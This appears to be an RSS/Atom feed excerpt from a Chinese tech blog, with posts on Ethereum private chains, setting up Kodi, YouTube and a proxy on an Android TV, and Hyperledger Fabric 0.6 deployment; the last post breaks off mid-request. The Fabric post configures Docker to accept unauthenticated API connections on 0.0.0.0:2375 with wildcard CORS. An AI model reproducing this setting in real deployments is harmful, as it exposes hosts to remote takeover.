recipient=0x7cbe4019e993f9922b8233502d94890099ee59e6</span><br><span class="line">&quot;0x29b47d580ba6ccb2445aa3ebdcb14567bd5cbc6004edef7a4064c36e0606bca2&quot;</span><br></pre></td></tr></table></figure><p>如果只是本地运行该方法查看返回结果，可以采用如下方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; contract.multiply(2，4)</span><br><span class="line">8</span><br></pre></td></tr></table></figure><h2 id="术语说明"><a href="#术语说明" class="headerlink" title="术语说明"></a>术语说明</h2><p>术语 |  | 说明<br>—–|—–<br>ABI | Application Binary Interface，应用二进制接口 | 其中指定了合约接口，包括可调用的合约方法、变量、事件等。<br>DApp | Decentralized App，去中心化的应用程序 | 基于智能合约的应用称为去中心化的应用程序。<br>EVM | Ethereum Virtual Machine，以太坊虚拟机 | 以太坊智能合约的运行环境。<br>Gas | （消耗的）汽油 | 在以太坊上发起交易、部署合约和调用合约都要消耗一定量的以太币，这些消耗的以太币称为 Gas。<br>Geth | - | 以太坊客户端 go-ethereum，使用 Go 语言编写，是最常用的以太坊客户端之一。<br>Solidity | - | 以太坊智能合约的一种编程语言，类似 JavaScript。<br>Remix IDE | <a href="https://remix.ethereum.org" target="_blank" rel="noopener">https://remix.ethereum.org</a> | 基于浏览器的 Solidity 集成开发环境，在浏览器中编写和调试智能合约。</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li>《区块链——原理、设计与应用》杨保华、陈昌编著，机械工业出版</li><li>以太坊学习笔记：私有链搭建操作指南 <a href="https://my.oschina.net/u/2349981/blog/865256" target="_blank" rel="noopener">https://my.oschina.net/u/2349981/blog/865256</a></li><li>利用puppeth搭建POA共识的以太坊私链网络 <a href="https://github.com/xiaoping378/blog/blob/master/posts/%E4%BB%A5%E5%A4%AA%E5%9D%8A-%E7%A7%81%E6%9C%89%E9%93%BE%E6%90%AD%E5%BB%BA%E5%88%9D%E6%AD%A5%E5%AE%9E%E8%B7%B5.md" target="_blank" rel="noopener">https://github.com/xiaoping378/blog/blob/master/posts/%E4%BB%A5%E5%A4%AA%E5%9D%8A-%E7%A7%81%E6%9C%89%E9%93%BE%E6%90%AD%E5%BB%BA%E5%88%9D%E6%AD%A5%E5%AE%9E%E8%B7%B5.md</a></li><li>区块链技术指南 <a href="https://yeasy.gitbooks.io/blockchain_guide/ethereum/install.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/blockchain_guide/ethereum/install.html</a></li><li>Solidity 官方文档 <a href="http://solidity.readthedocs.io/en/latest/installing-solidity.html" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/latest/installing-solidity.html</a></li><li>Go 官方文档 <a href="https://golang.org/doc/install" target="_blank" rel="noopener">https://golang.org/doc/install</a></li></ul><blockquote><p>更多区块链资料，请访问 <a href="https://github.com/gymgle/blockchain-reference" target="_blank" rel="noopener">https://github.com/gymgle/blockchain-reference</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h2&gt;&lt;h3 id=&quot;一、为什么用到私有链？&quot;&gt;&lt;a href=&quot;#一、为什么用到私有链？&quot; class=&quot;headerlink&quot; title=&quot;一、为
      
    
    </summary>
    
    
      <category term="Blockchain" scheme="https://g2ex.top/tags/Blockchain/"/>
    
      <category term="以太坊" scheme="https://g2ex.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
      <category term="Ethereum" scheme="https://g2ex.top/tags/Ethereum/"/>
    
      <category term="Solidity" scheme="https://g2ex.top/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>Android 电视折腾记</title>
    <link href="https://g2ex.top/2017/08/04/android-tv-notes/"/>
    <id>https://g2ex.top/2017/08/04/android-tv-notes/</id>
    <published>2017-08-04T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>要从 BBC 放出的几段《<a href="https://www.youtube.com/playlist?list=PLtra-MWzIvZGdqzuA59Jp0dZVzpmNZyT0" target="_blank" rel="noopener">Planet Earth II</a>》说起，突发奇想地打算在小米电视上看 YouTube 视频，电视的系统基于 Android 6.0.1，最终通过 Kodi + Youtube 插件成功实现目的。</p><h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>Kodi 原名 XBMC，是一个开源跨平台的多媒体播放平台，支持视频、音乐、图片、直播、本地和在线媒体、网络服务等等。Kodi 最让人称奇的是它众多的插件，通过对应的插件，网络上的各种资源就可以完美地在 Kodi 中播放。</p><p>不过，在国内，要想观看 YouTube，还要考虑的一个问题是让电视自动翻墙。</p><p>这里以小米电视为例，当然也可以是其他 Android 电视，也可以是各种盒子。</p><h2 id="0x01-让电视科学上网"><a href="#0x01-让电视科学上网" class="headerlink" title="0x01 让电视科学上网"></a>0x01 让电视科学上网</h2><p>有以下选择（前提是你有一台海外 VPS，搭建了 Shadowsocks 服务端，或者是配置了 VPN）：</p><ol><li>家用路由器翻墙。目前用的是小米路由器，需要刷开发版 ROM 获取 root 权限，才能安装 Shadowsocks 客户端实现自动翻墙，比较麻烦；现在小米 WiFi App 可以设置<code>智能 VPN</code>，支持 <code>选择地址限流</code> 和 <code>选择设备限流</code>，如果选择电视限流的话，电视相当于是全局 VPN 了。</li><li>不想折腾路由器的，可以用一台局域网电脑作为家庭代理，安装上 Shadowsocks 和 Privoxy（支持局域网的 SOCKS/http/https 代理）。按照这种思路最好弄个树莓派做家庭代理。</li><li>电视上安装翻墙 App，可选 Shadowsocks 和 Postern。</li></ol><p>这里选择在电视安装 <a href="https://github.com/postern-overwal/postern-stuff" target="_blank" rel="noopener">Postern App</a>。最主要原因是 Postern 的自动翻墙配置利用了 GEOIP 库可以精准地实现「国内流量直连，国外流量走代理」。Shadowsocks 设置里因为用 <code>8.8.8.8</code> DNS（或其他） 去解析域名，国内的某些提供了海外加速的服务就会被解析到国外 IP 上，反而更慢了。另外，Postern 还能在配置里过滤广告。</p><p>具体的过程：</p><ol><li><p>下载 Postern App <a href="https://github.com/postern-overwal/postern-stuff" target="_blank" rel="noopener">https://github.com/postern-overwal/postern-stuff</a></p></li><li><p>下载自动翻墙配置文件 <a href="https://github.com/postern-overwal/postern-stuff/blob/master/postern-rule-geoip.conf" target="_blank" rel="noopener">https://github.com/postern-overwal/postern-stuff/blob/master/postern-rule-geoip.conf</a></p></li><li><p>把配置文件中的代理改为自己的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Proxy]</span><br><span class="line">Proxy = shadowsocks,xxx.xxx.xxx.xxx,1080,aes-256-cfb,password</span><br></pre></td></tr></table></figure></li><li><p>小米电视的文件浏览器只能看到视频、图片格式的文件，所以要安装一个文件管理器。下载 MiXplorer <a href="https://forum.xda-developers.com/showthread.php?t=1523691" target="_blank" rel="noopener">https://forum.xda-developers.com/showthread.php?t=1523691</a> 也可以使用你习惯的 App。</p></li><li><p>把 Postern、修改的 postern-rule-geoip.conf、MiXplorer 放进 U 盘，插到电视上。在电视上安装 Postern 和 MiXplorer。</p></li><li><p>使用 MiXplorer 把 U 盘里的 postern-rule-geoip.conf 复制到电视内部存储随便一个位置，点击该配置文件，选择使用 Postern 打开，就能把配置文件导入到 Postern 中了。</p></li></ol><blockquote><p>之所以用 MiXplorer 把 U 盘中的配置文件复制到电视内部存储中，是因为在 U 盘中直接打开配置文件，是无法选择使用 Postern 打开的 :(</p></blockquote><blockquote><p>另外，Postern 不仅支持 Shadowsocks，也支持 SSH、SOCKS5、HTTP/HTTPS 代理类型</p></blockquote><h2 id="0x02-安装-Kodi-和插件"><a href="#0x02-安装-Kodi-和插件" class="headerlink" title="0x02 安装 Kodi 和插件"></a>0x02 安装 Kodi 和插件</h2><ol><li><p>去<a href="https://kodi.tv/download" target="_blank" rel="noopener">官网</a>下载 Android 平台下的 Kodi。要根据你电视的 CPU 类型选择，一般来说 ARM 系列比较常见。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2017-08-04_112344.webp" alt="下载 Kodi"></p></li><li><p>通过 U 盘，在电视上安装 Kodi App。</p></li><li><p>第一次打开 Kodi 界面是英文，如果想切换中文，需要先在 <code>Interface settings</code> 的 <code>Skin</code> 里，把 <code>Fonts</code> 由默认改为 <code>Arial based</code>，否则切换成中文后，中文字体无法显示。然后在 <code>Interface settings</code> 的 <code>Regional</code> 中把 <code>Language</code> 改为 <code>Chinese (Simple)</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2017-08-04_132530.webp" alt="设置字体"></p></li><li><p>在 Kodi 主界面左侧导航栏，依次点击 <code>插件</code> -&gt; <code>下载</code> -&gt; <code>视频插件</code>，在列表中找到 <code>YouTube</code>，然后点击安装。</p></li><li><p>打开 Postern，在 Kodi 主界面的视频导航栏中，就可以看到视频插件中有刚刚安装的 YouTube 了。点击 <code>Sign in</code> 登录 YouTube，需要电脑上打开 youtube.com/activate 输入 8 个字符的验证码去授权电视上的 YouTube 登录。</p></li><li><p>登录后就可以看到自己 YouTube 账号里的所有视频了，Enjoy~</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2017-08-04_132531_MITVScreenshot_org.xbmc.kodi.webp" alt="Kodi Youtube"></p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2017-08-04_132532_MITVScreenshot_org.xbmc.kodi.webp" alt="Kodi Youtube"></p></li></ol><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>Kodi 已经可以称作平台级的多媒体工具了，通过插件，还能把玩 Udacity、Vimeo、500px、iPhoto 等等。Kodi 媒体库里能添加本地、家庭路由器硬盘、网络服务中的视频、音乐和图片，也能观看点视直播，可玩性极高。</p><p>常见的智能电视和电视盒子，大部分是基于 Android 系统，只是没有手机的屏幕触碰，只能通过遥控器去点按，操作起来费劲。不过可以用蓝牙鼠标连接电视，操作要方便一些。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;要从 BBC 放出的几段《&lt;a href=&quot;https://www.youtube.com/playlist?list=PLtra-MWzIvZGdqzuA59Jp0dZVzpmNZyT0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Planet Ear
      
    
    </summary>
    
    
      <category term="Android" scheme="https://g2ex.top/tags/Android/"/>
    
      <category term="Kodi" scheme="https://g2ex.top/tags/Kodi/"/>
    
      <category term="Youtube" scheme="https://g2ex.top/tags/Youtube/"/>
    
      <category term="Shadowsocks" scheme="https://g2ex.top/tags/Shadowsocks/"/>
    
      <category term="TV" scheme="https://g2ex.top/tags/TV/"/>
    
  </entry>
  
  <entry>
    <title>Fabric 0.6 多节点部署视频演示</title>
    <link href="https://g2ex.top/2017/06/16/fabric-0.6-demo-vedio/"/>
    <id>https://g2ex.top/2017/06/16/fabric-0.6-demo-vedio/</id>
    <published>2017-06-16T12:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>随着 Fabric 1.0 beta 版本的发布，0.6 版本即将成为历史。在 1.0 架构面前，0.6 更像一个简单的「玩具」实验版本。在新的版本中，除了架构进行了重新设计，引入了 Channel、Endorser、Orderer、Committer 的概念外，链码编写的规则也有所变化，移除了 Table 操作的 API（Table API 实际上封装了 State API），接口返回值也有了特定的 pb.Response 类型。</p><p>本文录制了一个基于 Fabric 0.6 版本的平台部署、链码部署和测试的一个视频。以此纪念即将过去的 0.6 稳定版。</p><p><a href="https://www.youtube.com/watch?v=h48tgs2AWdQ" title="点击前往 YouTube 观看" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2017-06-16_Deploy-example02-based-on-fabric-0.6.webp" alt="videoimg"></a></p><hr><p>视频中，Fabric 平台使用 docker-compose 配置文件搭建部署，使用了 <a href="https://github.com/yeasy/docker-compose-files" target="_blank" rel="noopener">docker-compose-files</a> 项目下的 <a href="https://github.com/gymgle/docker-compose-files/blob/master/hyperledger/0.6/pbft/4-peers-with-membersrvc-explorer.yml" target="_blank" rel="noopener">4-peers-with-membersrvc-explorer.yml</a>，具有 4 个 PBFT peer 节点 + 1 个 CA 节点 + 1 个 Blockchain-explorer。</p><p>视频中使用的链码是 Fabric 源码中的 <a href="https://github.com/hyperledger/fabric/tree/master/examples/chaincode/go/chaincode_example02" target="_blank" rel="noopener">chaincode_example02</a>。</p><p>需要注意的几点：</p><ol><li><p>使用的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull hyperledger/fabric-peer:x86_64-0.6.1-preview \</span><br><span class="line">&amp;&amp; docker pull hyperledger/fabric-membersrvc:x86_64-0.6.1-preview \</span><br><span class="line">&amp;&amp; docker pull yeasy/blockchain-explorer:latest \</span><br><span class="line">&amp;&amp; docker tag hyperledger/fabric-peer:x86_64-0.6.1-preview hyperledger/fabric-peer \</span><br><span class="line">&amp;&amp; docker tag hyperledger/fabric-peer:x86_64-0.6.1-preview hyperledger/fabric-baseimage \</span><br><span class="line">&amp;&amp; docker tag hyperledger/fabric-membersrvc:x86_64-0.6.1-preview hyperledger/fabric-membersrvc</span><br></pre></td></tr></table></figure></li><li><p>Docker compose file 的配置</p><p>Clone <a href="https://github.com/yeasy/docker-compose-files" target="_blank" rel="noopener">docker-compose-files</a> 项目后，需修改 <code>hyperledger/0.6/pbft</code> 中的 <code>4-peers-with-membersrvc-explorer.yml</code> 和 <code>peer.yml</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 4-peers-with-membersrvc-explorer.yml</span><br><span class="line"># 移除 networks 的注释</span><br><span class="line">networks:</span><br><span class="line">  default:</span><br><span class="line">    external:</span><br><span class="line">      name: fabric_pbft</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># peer.yml</span><br><span class="line"># 移除 CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE 一行的注释</span><br><span class="line">- CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=fabric_pbft</span><br></pre></td></tr></table></figure></li><li><p>创建 docker 网络 <code>fabric_pbft</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker network create fabric_pbft</span><br></pre></td></tr></table></figure></li><li><p>REST API 的使用</p><p>视频中使用了 <code>Postman</code> 与 Fabric 的 VP0 节点交互。</p><p>在部署链码 <code>chaincode_example02</code> 之前，我把链码复制到了 VP0 节点中的 <code>/opt/gopath/github.com/chaincode_example02</code> 目录中，所以在 <code>Postman</code> 中部署链码时，JSON 参数 <code>path</code> 为 <code>github.com/chaincode_example02</code>，即链码路径。这样是为了让节点中的 go 能找到链码并进行编译。</p></li><li><p>多读文档，比如：<br><a href="https://yeasy.gitbooks.io/blockchain_guide/content/fabric/v0.6/install.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/blockchain_guide/content/fabric/v0.6/install.html</a><br><a href="https://github.com/yeasy/docker-compose-files/tree/master/hyperledger/0.6" target="_blank" rel="noopener">https://github.com/yeasy/docker-compose-files/tree/master/hyperledger/0.6</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着 Fabric 1.0 beta 版本的发布，0.6 版本即将成为历史。在 1.0 架构面前，0.6 更像一个简单的「玩具」实验版本。在新的版本中，除了架构进行了重新设计，引入了 Channel、Endorser、Orderer、Committer 的概念外，链码编写的
      
    
    </summary>
    
    
      <category term="Blockchain" scheme="https://g2ex.top/tags/Blockchain/"/>
    
      <category term="Hyperledger" scheme="https://g2ex.top/tags/Hyperledger/"/>
    
      <category term="fabric" scheme="https://g2ex.top/tags/fabric/"/>
    
  </entry>
  
  <entry>
    <title>区块链学习指南</title>
    <link href="https://g2ex.top/2017/02/20/Blockchain-Guide/"/>
    <id>https://g2ex.top/2017/02/20/Blockchain-Guide/</id>
    <published>2017-02-20T22:18:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-说明"><a href="#0x00-说明" class="headerlink" title="0x00 说明"></a>0x00 说明</h2><p>从 2016 年开始，进行区块链技术预研并选择 Hyperledger fabric 平台实现场景的落地，在这个过程中，通过对区块链技术的学习和总结，整理出本文的学习路线。以此作为一个入门参考，希望能够帮助到对区块链技术感兴趣，并想要深入学习它的人们。</p><h2 id="0x01-从比特币开始"><a href="#0x01-从比特币开始" class="headerlink" title="0x01 从比特币开始"></a>0x01 从比特币开始</h2><p>区块链技术脱胎于比特币，因此想要深入了解区块链技术，可以先从了解比特币入手。</p><p>《<a href="http://zhibimo.com/books/wang-miao/mastering-bitcoin" target="_blank" rel="noopener">精通比特币</a>》是目前对比特币机制讲解最为详细、分析最为彻底的书。但在阅读此书之前，你可以搜一下《易懂的比特币工作机理详解》，该文通俗简短，阅读的过程中记下自己的问题，然后在《精通比特币》中找到答案。</p><p>对于<a href="http://www.8btc.com/wiki/bitcoin-a-peer-to-peer-electronic-cash-system" target="_blank" rel="noopener">比特币白皮书</a>，并未对比特币原理做详细介绍，略读即可。</p><h2 id="0x02-入门区块链技术"><a href="#0x02-入门区块链技术" class="headerlink" title="0x02 入门区块链技术"></a>0x02 入门区块链技术</h2><p>这个阶段，比较推荐的书是《<a href="https://www.gitbook.com/book/yeasy/blockchain_guide/details" target="_blank" rel="noopener">区块链技术指南</a>》，本书由 IBM <a href="https://yeasy.github.io/" target="_blank" rel="noopener">杨宝华</a>撰写，能对区块链有如此透彻的理解，也源于他所在的 Hyperledger 项目。同时，本书也可以作为接下来要学习的区块链平台的参考书。</p><h2 id="0x03-以太坊-or-Hyperledger"><a href="#0x03-以太坊-or-Hyperledger" class="headerlink" title="0x03 以太坊 or Hyperledger?"></a>0x03 以太坊 or Hyperledger?</h2><p>接下来，选择一个区块链平台去研究。当然，这里不是单选，以太坊和 Hyperledger 都可以研究。这两者的目标都是打造一个区块链平台，造福区块链应用的开发者，让其开发更简单，无需自己实现复杂的区块链底层。但以太坊更倾向于建设共有链，Hyperledger 则是联盟链。</p><p>在 Hyperledger 项目中，fabric 项目是开发和迭代比较迅速的一个。因背后有 IBM 的技术力量，fabric 也是最被看好的一个区块链平台。我们的项目也是基于此平台开发。</p><p>fabric 有一份中文的<a href="https://github.com/hyperledger/fabric/blob/master/docs/protocol-spec_zh.md" target="_blank" rel="noopener">协议规范</a>，可以由此开始 fabric 的学习。在学习过程中，可以参考 IBM 的 <a href="https://github.com/IBM-Blockchain/learn-chaincode" target="_blank" rel="noopener">Learn Chaincode</a> 项目上手练习，这个项目也有一份几个月前我翻译的<a href="https://github.com/IBM-Blockchain/learn-chaincode/blob/master/README_zh-cn.md" target="_blank" rel="noopener">中文版本</a>说明。</p><p>同时，IBM 也提供了一份区块链<a href="https://www.ibm.com/developerworks/cn/cloud/library/cl-ibm-blockchain-101-quick-start-guide-for-developers-bluemix-trs/index.html" target="_blank" rel="noopener">开发人员快速入门指南</a>，作为参考。</p><h2 id="0x04-平台部署"><a href="#0x04-平台部署" class="headerlink" title="0x04 平台部署"></a>0x04 平台部署</h2><p>Fabric 的部署可以选择 <a href="https://console.ng.bluemix.net/catalog/services/blockchain" target="_blank" rel="noopener">IBM Bluemix Blockchain</a> 服务，亦或是本地部署。前者免去了本地部署的复杂步骤，而本地部署 fabric 便于调试和测试。</p><p>在编写完成自己的链码后，可以在单节点 fabric 网络中进行调试和测试，参照《<a href="https://g2ex.github.io/2016/11/26/Fabric-Deployment-and-Chaincode-Setup/" target="_blank" rel="noopener">Fabric 单节点部署与链码测试</a>》。</p><p>部署多节点的 fabric 网络适合场景的演示，参照《<a href="https://g2ex.github.io/2017/02/17/Fabric-Deployment-with-Multi-Peers/" target="_blank" rel="noopener">Fabric 多节点部署小结</a>》。</p><h2 id="0x05-区块链相关资料"><a href="#0x05-区块链相关资料" class="headerlink" title="0x05 区块链相关资料"></a>0x05 区块链相关资料</h2><p>最后，<a href="https://github.com/gymgle/blockchain-reference" target="_blank" rel="noopener">这里</a>总结了区块链相关的参考资料，会不定期更新。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-说明&quot;&gt;&lt;a href=&quot;#0x00-说明&quot; class=&quot;headerlink&quot; title=&quot;0x00 说明&quot;&gt;&lt;/a&gt;0x00 说明&lt;/h2&gt;&lt;p&gt;从 2016 年开始，进行区块链技术预研并选择 Hyperledger fabric 平台实现场景的
      
    
    </summary>
    
    
      <category term="Blockchain" scheme="https://g2ex.top/tags/Blockchain/"/>
    
      <category term="Bitcoin" scheme="https://g2ex.top/tags/Bitcoin/"/>
    
      <category term="Hyperledger" scheme="https://g2ex.top/tags/Hyperledger/"/>
    
      <category term="fabric" scheme="https://g2ex.top/tags/fabric/"/>
    
  </entry>
  
  <entry>
    <title>Fabric 多节点部署小结</title>
    <link href="https://g2ex.top/2017/02/17/Fabric-Deployment-with-Multi-Peers/"/>
    <id>https://g2ex.top/2017/02/17/Fabric-Deployment-with-Multi-Peers/</id>
    <published>2017-02-17T20:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-说明"><a href="#0x00-说明" class="headerlink" title="0x00 说明"></a>0x00 说明</h2><p>上篇文章《<a href="https://g2ex.github.io/2016/11/26/Fabric-Deployment-and-Chaincode-Setup/" target="_blank" rel="noopener">Fabric 单节点部署与链码测试</a>》中，总结了单认证节点的 fabric 区块链网络的部署和测试。在 fabric 中，单认证节点的网络不使用共识算法，主要用于测试和调试链码。在实际应用场景的 demo 中，有必要使用多节点进行演示，节点之间使用的是推荐的 PBFT 共识算法。</p><p>Fabric 目前尚未发布 1.0 正式版。本文仍然基于 Ubuntu 平台，使用 fabric 的 0.6 版本 docker 镜像，部署有 4 个认证节点的区块链网络。（参考《<a href="https://yeasy.gitbooks.io/blockchain_guide/content/hyperledger/install.html" target="_blank" rel="noopener">区块链技术指南</a>》）</p><h2 id="0x01-获取-Docker-镜像"><a href="#0x01-获取-Docker-镜像" class="headerlink" title="0x01 获取 Docker 镜像"></a>0x01 获取 Docker 镜像</h2><p>参照《<a href="https://g2ex.github.io/2016/11/26/Fabric-Deployment-and-Chaincode-Setup/" target="_blank" rel="noopener">Fabric 单节点部署与链码测试</a>》安装 docker 和 docker-compose。</p><h3 id="配置-docker"><a href="#配置-docker" class="headerlink" title="配置 docker"></a>配置 docker</h3><p>Docker 安装完成后需要进行配置。需要注意的是，Ubuntu 14.04 和 16.04 中，docker 的配置文件不同。</p><p>Ubuntu 14.04 中，配置文件位于 <code>/etc/default/docker</code>，Ubuntu 16.04 中，配置文件位于 <code>/etc/systemd/system/docker.service.d/override.conf</code> 中（如果配置文件不存在则创建）。</p><p>在 docker 的配置文件中，修改以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCKER_OPTS=&quot;$DOCKER_OPTS -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock --api-cors-header=&apos;*&apos;&quot;</span><br></pre></td></tr></table></figure><h3 id="加速-docker-镜像"><a href="#加速-docker-镜像" class="headerlink" title="加速 docker 镜像"></a>加速 docker 镜像</h3><p>因为网络原因，直接从 docker 官方下载速度缓慢，或时而中断。阿里云容器 Hub 服务提供了加速功能。登录<a href="https://cr.console.aliyun.com/" target="_blank" rel="noopener">阿里云容器 Hub 服务</a>，在<strong>加速器</strong>一栏中获取自己的加速器地址。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2017-02-17_152821.webp" alt="docker-accelerator"></p><p>参照阿里云操作文档，修改 docker 的配置。</p><p>本文使用的是 Ubuntu 16.04，docker 版本为 1.13，修改方法如下。</p><p>创建 <code>/etc/docker/daemon.json</code> 文件，添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;你的加速器地址&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重启 docker：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl daemon-reload</span><br><span class="line">$ sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="获取-fabric-镜像"><a href="#获取-fabric-镜像" class="headerlink" title="获取 fabric 镜像"></a>获取 fabric 镜像</h3><p>这里获取 fabric 官方的镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull hyperledger/fabric-peer:x86_64-0.6.1-preview \</span><br><span class="line">&amp;&amp; docker pull hyperledger/fabric-membersrvc:x86_64-0.6.1-preview \</span><br><span class="line">&amp;&amp; docker pull yeasy/blockchain-explorer:latest \</span><br><span class="line">&amp;&amp; docker tag hyperledger/fabric-peer:x86_64-0.6.1-preview hyperledger/fabric-peer \</span><br><span class="line">&amp;&amp; docker tag hyperledger/fabric-peer:x86_64-0.6.1-preview hyperledger/fabric-baseimage \</span><br><span class="line">&amp;&amp; docker tag hyperledger/fabric-membersrvc:x86_64-0.6.1-preview hyperledger/fabric-membersrvc</span><br></pre></td></tr></table></figure><h2 id="0x02-启动集群并部署"><a href="#0x02-启动集群并部署" class="headerlink" title="0x02 启动集群并部署"></a>0x02 启动集群并部署</h2><h3 id="使用-docker-compse-启动集群"><a href="#使用-docker-compse-启动集群" class="headerlink" title="使用 docker-compse 启动集群"></a>使用 docker-compse 启动集群</h3><p>使用 docker-compose 更方便的启动多容器节点，下载 Compose 模板文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/yeasy/docker-compose-files</span><br></pre></td></tr></table></figure><p>进入 <code>hyperledger/0.6/pbft</code> 目录，以启动 4 个 PBFT 认证节点 + 1 个 CA 节点为例，启动集群：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose -f 4-peers-with-membersrvc.yml up</span><br></pre></td></tr></table></figure><h3 id="把链码复制到认证节点中"><a href="#把链码复制到认证节点中" class="headerlink" title="把链码复制到认证节点中"></a>把链码复制到认证节点中</h3><p>集群中 VP0 是 Root VP 节点，进入 VP0，可以看到 fabric 路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker exec -it pbft_vp0_1 bash</span><br><span class="line">root@vp0:/opt/gopath/src/github.com/hyperledger/fabric#</span><br></pre></td></tr></table></figure><p>以示例 02 为例，把链码复制到 VP0 节点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker cp chaincode_example02/ pbft_vp0_1:/opt/gopath/src/github.com/</span><br></pre></td></tr></table></figure><h3 id="通过-REST-API-部署链码"><a href="#通过-REST-API-部署链码" class="headerlink" title="通过 REST API 部署链码"></a>通过 REST API 部署链码</h3><p>注册账户登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1:7050/registrar</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;enrollId&quot;: &quot;jim&quot;,</span><br><span class="line">  &quot;enrollSecret&quot;: &quot;6avZQLwcUe9b&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>登录响应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;OK&quot;: &quot;Login successful for user &apos;jim&apos;.&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署链码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1:7050/chaincode</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;deploy&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">    &quot;type&quot;: 